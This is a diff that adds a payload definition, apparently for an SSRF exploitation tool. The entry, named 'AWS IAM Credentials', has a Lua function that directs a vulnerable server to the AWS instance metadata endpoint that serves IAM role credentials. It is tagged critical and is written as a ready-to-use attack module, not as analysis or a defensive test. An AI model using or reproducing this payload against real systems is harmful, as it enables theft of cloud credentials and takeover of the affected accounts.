@@ -1,0 +1,24 @@
+meta:
+  id: aws_metadata_iam
+  version: 1
+  name: "AWS IAM Credentials"
+  description: "Retrieve AWS IAM role credentials"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 100
+  confidence: 90
+  severity: critical
+  tags: [aws, iam, credentials, cloud]
+  references: []
+match:
+  schemes: [http]
+  requires: [hostname]
+  supports: [cloud]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
+    end
